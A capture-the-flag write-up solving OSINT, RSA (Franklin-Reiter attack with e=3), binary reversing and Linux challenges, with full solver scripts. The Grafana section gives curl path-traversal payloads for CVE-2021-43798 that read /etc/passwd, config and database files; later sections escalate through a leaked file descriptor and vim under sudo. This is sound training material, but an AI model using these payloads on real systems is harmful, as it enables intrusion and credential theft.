# Operation_Shadow_control_Writeups
___
##### Flags found:
>
___


## Trail 1: Kalpit lal Rama (OSINT)

From the problem we know, the hacker used his real name, Kalpit Lal Rama
Following the trail ,(using google dorking, spider foot), we find his LinkedIn account, then X-account, followed by a Reddit account.
Here we notice two different "puzzles". 
1. A recent one pointing towards a Top Gear Special Episode.
    (went through the article, and the episode of Top Gear, the solution was possible time difference between two events or distance between two places, closely associated with the life of Sir Steve Redgrave)  

2. Other a list of numbers possibly something decrypted.

Using the Cipher Identifier from dcode, we notice it is a Base36 encrypted string, decrypting it,
>7JJFI MMM 8DIJ06H0C 2EC 8 B8A4 0DEDOC8JO IEC4J8C4IRSRS

We get a stream of alphabets and numbers, noticing it seems to be rotated by some offset
rotating the alphabets by 10.
>7TTPS WWW 8NST06R0M 2OM 8 L8K4 0NONYM8TY SOM4T8M4SBCBC

simplifing it we get https://www.instagram.com/i_like_anonymity_sometimes1212/
This is the instagram account of the culprit.

Going through his rowing spams, we find a suspicious story of a wikipedia page 
[Wikipedia page](https://en.wikipedia.org/w/index.php?title=Thomas_Keller_Medal&oldid=1290220257)

Looking throughout the page, we find that there were some changes done by KapiLal20
Looking further into the changes we find 

>PClub{idk_how_this_got_typed}
>
>Nice job though! Here's the next challenge : https://pastebin.com/v9vuHs52 

___

On the pastebin page we find access to the next challenges.

Challenge 1 : Connect to 3.109.250.1 at port 5000
Challenge 2 : https://cybersharing.net/s/327d3991cd34b223
___

## Trail_1  RSA
Connecting to the remote server, we find. 
```bash
$ nc  3.109.250.1 5000

Find a string such that SHA-256 hash of "bdFsvj" concatenated with your input starts with the the string "50039".
```
```
$ nc  3.109.250.1 5000

Find a string such that SHA-256 hash of "LkOJut" concatenated with your input starts with the the string "30642".
```
Hmmm, We need to proceed using pwntools

writing a python script that produces all possible combination of string and matching its sha256 hash with the prefix.

```python
from pwn import *
import hashlib

# hash_find function
def find_match(prefix, target_start):
    max_length = 6
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    base = len(chars)

    for str_len in range(1, max_length + 1):
        indices = [0] * str_len
        for _ in range(base**str_len):
            suffix = ''.join([chars[i] for i in indices])
            hash_res = hashlib.sha256((prefix+suffix).encode()).hexdigest()

            if hash_res.startswith(target_start):
                return suffix

            # base-N counter++
            for i in range(str_len-1,-1,-1):
                indices[i] += 1
                if indices[i] < base:
                    break
                indices[i] = 0
    

# pwntool script 
t = remote("3.109.250.1",5000)

t.recvline() # take in the new line and forget it 

line =t.recvline().split(b'"')

prefix = line[1].decode()
target_start = line[3].decode()

t.sendline(find_match(prefix,target_start).encode())

t.interactive()
```
Proceeding through the script, we get
```bash
[+] Opening connection to 3.109.250.1 on port 5000: Done
[*] Switching to interactive mode
gFg3

    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
```
Running the code thrice, we get

```python
from Crypto.Util.number import bytes_to_long
from hashlib import sha256
import random
import os, sys

m = b"PClub{Fake_Flag}"
n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
e = 3
def options():
    help_menu = """
    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?"""
    while True:
        print(help_menu)
        c = input().strip()
        if c == "1":
            return 1
        elif c == "2":
            return 2
        elif c == "3":
            return 3
        else:
            print("Please select a valid option!")
            
def proof():
    _x = "abcdefghijklmnopqrstuvwxyzFRLMAOEWJASK"
    _y = "".join(random.sample(_x, 6))
    _z = str(random.randint(10000, 99999))
    print(f'\nFind a string such that SHA-256 hash of "{_y}" concatenated with your input starts with the the string "{_z}".')
    _u = input().strip()
    return hashlib.sha256((_y + _u).encode()).hexdigest()[:len(_z)] == _z
def main():
    if not proof():
        print("Check Failed!")
        return
    return_val = options()
    if return_val==1:
        f = open("./part1.py")
        print(f.read())
        return
    elif return_val==2:
        f = open("./part2.py")
        print(f.read())
        return
    elif return_val==3:
        byts = bytes_to_long(m)
        sys.stdout.write("Give me a padding: ")
        padding = input().strip()
        padding = int(sha256(padding.encode()).hexdigest(), 16)
        c = pow(byts + padding, e, n)
        print("Ciphertext : ", c)
    else : 
        print("Invalid")
        return 
        
        
if __name__ == '__main__':
    try:
        main()
    except:
        os._exit(-1)
```
```
What do you want ?
$ 3
Give me a padding: $ 1
Ciphertext :  13437526472436443794216183194447347160957723113505232847990603147292226928038102057351088581769825769065742799938562195899137207985168638686932973500805175120244776171552623797311717352445842354506839648768961557995566066583379882671063443061221126889161415626667882853789182863427348340550703864877348720316075406615895429590542123490206825841826084125675586562000477548391938871164802515094842964422894509501874136226610585205845061872299086431519078988424124896067831101905411828982263797227188944518022431818652500299284644830387239226510273289074636855097814995843282536891849770922688308317857032217413503938121
```

The python script is what's running on the server, it uses RSA to decrypt the flag along with a hash-padding. 
```
        padding = int(sha256(padding.encode()).hexdigest(), 16)
        c = pow(byts + padding, e, n)
        print("Ciphertext : ", c)
```
Its the usual Rsa but with padding done on the text before encryption.
What's interesting is that the value of e used is 3 which is much smaller than the usual 65667.
A bit surfing on Google says that there is an attack named "Franklin Reiter's Attack on related messages" which exploits using small e on same message with small padding.
Researching more on the attack, we proceed by building a sage script to decode the flag

```
import hashlib
def gcd(a, b): 
    while b:
        a, b = b, a % b
    return a.monic()

n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
pad1 = int(hashlib.sha256("1".encode()).hexdigest(),16)
pad2 = int(hashlib.sha256("2".encode()).hexdigest(),16)
c1 = 13437526472436443794216183194447347160957723113505232847990603147292226928038102057351088581769825769065742799938562195899137207985168638686932973500805175120244776171552623797311717352445842354506839648768961557995566066583379882671063443061221126889161415626667882853789182863427348340550703864877348720316075406615895429590542123490206825841826084125675586562000477548391938871164802515094842964422894509501874136226610585205845061872299086431519078988424124896067831101905411828982263797227188944518022431818652500299284644830387239226510273289074636855097814995843282536891849770922688308317857032217413503938121
c2 = 13437526472436443794216183194447347160957723113505232847991197044990694452064187638828229250639551255210316763627721100364952531534410262274944422259435782727763358752227406490092795775074286982312189166588418626166051425763659104611533200781764628814830491620927191511939357688185404755633404206702773120838149187777597581080271639970862466076576509151108609217917755193696604489093301419660992126973461884190135876181959228647321165835055056071342463501310454319921715938715852965567400098245092949393052106130061931330924706220158687374897426386916510522364086747482531381128881740542369109849527510266076215148177

R.<X> = PolynomialRing(Zmod(n))

f1 = (X + pad1)^3 - c1
f2 = (X + pad2)^3 - c2

result = -gcd(f1, f2).coefficients()[0]

print(result)
```
>2042383463236020343574058271837516401040605646841453458056013598665011120013837247880015119472155885917517533844146028050099663389775671032369144600253962591066925125579211204619065812739390786553537213776113421680721219064337146017232153725

we get the result , converting it to bytes we get 
```
>>> from Crypto.Util.number  import long_to_bytes
>>> long_to_bytes(20423834632360203435740582718375164010406056468414534580560135986650111200138372478800151194721558859175175338441460280500996633897756710323691446002539625910669251255792112046190658127393907865535372137761134\
21680721219064337146017232153725)
b'Nice work breaking through this SECURE SYSTEM! You deserve this flag: PClub{Franklin_Reiter_is_cool}'
```  
> PClub{Franklin_Reiter_is_cool}


___
## Trail_1 Reverse Engineering

Now, In the link provided we find a binary named challenge
checking the file structure of binary
```
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=f3c6436d73103897223dd4919be3e9ba90906222, stripped
```
and pwn checksec the file
```
[*] '/home/ash/code/challenge'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```
Its a stripped and statically linked binary.

tried to decompile it with ghidra...
only useful thing found is the possible start of user written code (if) at 0x0046f240

Executing the binary with an argument flag, it gives an error "Wrong length"
Trying various string length we find the length of flag to be 25 chars.

Using Pwngdb to debug the binary, we set a breakpoint at 0x0046f240 (the start of entry function) and search for location of our input on stack
```
pwndbg> search 1234512345123451234512345
Searching for byte: b'1234512345123451234512345'
[stack]         0x7fffffffe119 '1234512345123451234512345'
```
now we set a watchpoint on this location to check when this data is read.
At 0x493931 we see that the data is read in a loop that runs 25 times.
reading through the assembly and checking the registers on each iteration, we notice that the input is xored with a xor-table and the data is stored on address at rax
looking at the data stored at rax and setting a read/write watchpoint on it
```
gef➤  x/10x 0x000000c0000ae020
0xc0000ae020:	0xc6cd210a	0xdf71995f	0xa6878b96	0xd4724635
0xc0000ae030:	0x8e59ccaf	0x17771e45	0x000000e0	0x00000000
0xc0000ae040:	0x00000000	0x00000000
gef➤  awatch *0xc0000ae020
Hardware access (read/write) watchpoint 5: *0xc0000ae020
```

At 0x493c7a, the xor-ed data is read in loop and something is stored again in rax
contuining we notice the hex bytes of the xor-ed data is converted to a hex string
```
0xc0000ae020:	0xc6cd210a	0xdf71995f	0xa6878b96	0xd4724635
0xc0000ae030:	0x8e59ccaf	0x17771e45	0x000000e0	0x00000000
```
is converted to 

```
gef➤  x/s $rax
0xc0000b0000:	"0a21cdc65f9971df968b87a6354672d4afcc598e451e7717e0"
```
further setting a breakpoint on the new stackl address
```
gef➤  awatch *0xc0000b0000
Hardware access (read/write) watchpoint 5: *0xc0000b0000
```

We notice something happening at 0x46eafe
```
     0x46eafa                  movdqu xmm0, XMMWORD PTR [rsi]
 →   0x46eafe                  movdqu xmm1, XMMWORD PTR [rsi+0x10]
     0x46eb03                  movdqu xmm2, XMMWORD PTR [rsi+rbx*1-0x20]
```
the data is copied from rsi+10 (our string) to somewhere, setting a breakpoint at this instruction
we notice a different string but of same size and format being copied
```
$rsi   : 0x000000c0000b0080  →  "6b50928708d30d85c1dbe9fe69101897f88908c907452a44a8"
```

This could be the required flag.
Now we possess everything we would require to decrypt this flag

First we'll try to get the xor_table from the bits we captured by xoring it back with our input then xoring that to the target hex we'll gt our flag

```
xor_captured = "0a21cdc65f9971df968b87a6354672d4afcc598e451e7717e0"
flag_xor = "6b50928708d30d85c1dbe9fe69101897f88908c907452a44a8"
input = "1234512345123451234512345"

xor_str = "3b 13 fe f2 6a a8 43 ec a2 be b6 94 06 72 47 e5 9d ff 6d bb 74 2c 44 23"

xor_int = [int(_,16) for _ in xor_str.split(" ")]


flag_bytes = [int(flag_xor[i]+flag_xor[i+1],16) for i in range(0,50,2)]
xor_bytes = [int(xor_captured[i]+xor_captured[i+1],16) for i in range(0,50,2)]
input_bytes = [ord(_) for _ in input]

ans = "".join([chr(xor_bytes[i]^flag_bytes[i]^input_bytes[i]) for i in range(25)])

print(ans)
```
>PClub{Nice_job_reversing}

# Trail 2 Grafana


Looking through the page, we find a link to the simple dashboad in grafana. The site has two pages, login and password reset.
On the reset password page, it shows the version of grafana as v8.3.0. 
Surfing through google for exploits possible in grafana v8.3.0. Seems like the the version is vulnerable to Directory Transversal from the plugins installed. (CVE-2021-43798)
There is a bug report on hackerone about exploiting the path transverasl vulnerability
https://hackerone.com/reports/1427086
Tried reading /etc/passwd defaults.ini , grafana.db from the server
`curl http://13.126.50.182/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 
curl http://13.126.50.182:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini`

The grafana.db contains password hashes, tried hashcat on that but to no avail.

After a hint that the flag is TEMPORARILY stored on user pc, we look into /tmp/ and /var/tmp, trying different links we try different locations to find flag stored in /tmp/flag



```
$curl http://13.126.50.182:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp/flag
PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

> PClub{Easy LFI} 


## Trail 2 Dropped priviledges
now for the next challenge we a IP with two ports. Connecting with netcat to 13.235.21.137:4657

```#include <fcntl.h>
#include <unistd.h>

int main () {
    int fd = open ("/root/flag", 0);

    // Dropping root privileges
    // definitely not forgetting anything
    setuid (getuid ());

    char* args[] = { "sh", 0 };
    execvp ("/bin/sh", args);
    return 0;
}
```

The code opens a flag stored in /root/flag with root permissions. But then the privileges are dropped.
We find 
"Once the file is open, you have access to it. The access is only checked at the time you open the file. The type of access depends on the mode used to open the file (i.e. read-only, write-only, append, read-write...)"
[source](https://stackoverflow.com/questions/45960961/open-a-file-as-root-but-drop-privileges-before-reading-from-it)

so we can most probably read from the  file descriptor stored in /proc/self/fd
looking into /proc/self/fd , we find
```bash
$ ls -la /proc/self/fd
total 0
dr-x------ 2 ctf ctf  5 May 25 02:24 .
dr-xr-xr-x 9 ctf ctf  0 May 25 02:24 ..
lrwx------ 1 ctf ctf 64 May 25 02:24 0 -> /dev/pts/32
lrwx------ 1 ctf ctf 64 May 25 02:24 1 -> /dev/pts/32
lrwx------ 1 ctf ctf 64 May 25 02:24 2 -> /dev/pts/32
lr-x------ 1 ctf ctf 64 May 25 02:24 3 -> /root/flag
lr-x------ 1 ctf ctf 64 May 25 02:24 4 -> /proc/2586/fd

```
But trying to read from /proc/self/fd/3 gives permissions denied error.
However cat <&3 does read the file
```bash
$ cat <&3
PClub{4lw4ys_cl05e_y0ur_fil3s}
```

## Trail_2 Priviledge Escalation
Connecting to the other version, we get a shell but with minimal permissions

Most probably it points to privilege Escalation exploit,
url :https://delinea.com/blog/linux-privilege-escalation

Using sudo -l to find the commands, the user has access to 


Since Vim has 777 permission bits, so we can read any file we wish if we open it using vim.
```bash
vim
:e /root/flag
```
This gives us the flag
>PClub{y0u_ar3_in_7he_sudoers_file_1nc1d3nt_will_n0t_be_rep0r7ed}
___





